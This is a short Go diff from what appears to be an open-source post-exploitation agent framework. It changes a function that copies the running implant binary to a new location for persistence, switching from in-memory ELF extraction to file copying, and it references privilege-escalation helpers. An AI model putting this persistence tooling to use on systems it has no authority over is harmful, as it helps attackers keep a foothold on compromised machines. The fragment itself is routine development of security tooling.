@@ -4,7 +4,6 @@
 package modules
 
 import (
-	"fmt"
 	"os"
 	"strings"
 
@@ -18,11 +17,6 @@ import (
 
 // Copy current executable to a new location
 func CopySelfTo(dest_file string) (err error) {
-	elf_data, err := util.FindEmp3r0rELFInMem()
-	if err != nil {
-		return fmt.Errorf("FindEXEInMem: %v", err)
-	}
-
 	// mkdir -p if directory not found
 	dest_dir := strings.Join(strings.Split(dest_file, "/")[:len(strings.Split(dest_file, "/"))-1], "/")
 	if !util.IsExist(dest_dir) {
@@ -37,7 +31,11 @@ func CopySelfTo(dest_file string) (err error) {
 		os.RemoveAll(dest_file)
 	}
 
-	return util.WriteFileAgent(dest_file, elf_data, 0o755)
+	if PersistFile != "" {
+		return util.Copy(PersistFile, dest_file)
+	}
+
+	return util.Copy(os.Args[0], dest_file)
 }
 
 // RunLPEHelper runs helper scripts to give you hints on how to escalate privilege
